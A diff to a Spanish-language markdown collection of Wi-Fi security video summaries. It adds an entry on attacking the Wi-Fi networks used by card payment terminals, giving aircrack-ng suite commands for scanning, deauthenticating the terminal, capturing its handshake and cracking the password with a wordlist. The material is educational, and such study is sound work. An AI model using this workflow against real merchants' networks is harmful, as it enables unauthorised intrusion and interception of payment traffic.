@@ -2051,3 +2051,44 @@ Este video desmitifica la seguridad de las redes Wi-Fi con SSID oculto y demuest
 - Ocultar el SSID ofrece una privacidad mínima frente a observadores casuales, pero ninguna seguridad real contra un atacante determinado.
 - Puede ser contraproducente, ya que algunos dispositivos pueden tener problemas de conexión o consumir más batería al buscar activamente redes ocultas.
 - No debe considerarse como una medida de seguridad, sino como una simple técnica de oscurecimiento.
+
+
+## 56. Ataques a Datáfonos
+
+Este video explora un caso específico y especializado: la vulneración de redes WiFi utilizadas por datáfonos.
+
+### Fundamento técnico:
+- Los datáfonos modernos suelen utilizar conexiones WiFi para comunicarse con los servidores de procesamiento de pagos.
+- El objetivo no es comprometer directamente el datáfono, sino la red WiFi a la que se conecta para potencialmente interceptar o manipular el tráfico.
+
+### Procedimiento del video:
+
+1. **Identificación de redes de datáfonos**:
+   ```bash
+   airodump-ng <interfaz_monitor>
+   ```
+   - Se buscan redes con nombres característicos de proveedores de TPV o con patrones de tráfico específicos.
+
+2. **Análisis del tráfico**:
+   ```bash
+   airodump-ng --bssid <BSSID_datáfono> -c <canal> -w captura <interfaz_monitor>
+   ```
+   - Se captura el tráfico para analizar patrones y protocolos utilizados.
+
+3. **Captura del handshake**:
+   ```bash
+   aireplay-ng -0 1 -a <BSSID_datáfono> -c <MAC_datáfono> <interfaz_monitor>
+   ```
+   - Se intenta desautenticar el datáfono para capturar el handshake cuando se reconecte.
+
+4. **Cracking de la contraseña**:
+   ```bash
+   aircrack-ng -w <wordlist>.txt <captura>.cap
+   ```
+   - Se utiliza un diccionario especializado con contraseñas comunes en datáfonos.
+
+### Características específicas de los datáfonos:
+- **Contraseñas predeterminadas**: Muchos datáfonos utilizan contraseñas predeterminadas o patrones predecibles.
+- **Configuración remota**: Algunos modelos permiten configuración remota, lo que puede ser explotado.
+- **Tráfico sensible**: El tráfico puede contener información de transacciones, aunque generalmente está cifrado a nivel de aplicación.
+- En un contexto real, estos sistemas suelen estar protegidos por múltiples capas de seguridad más allá de la red WiFi.
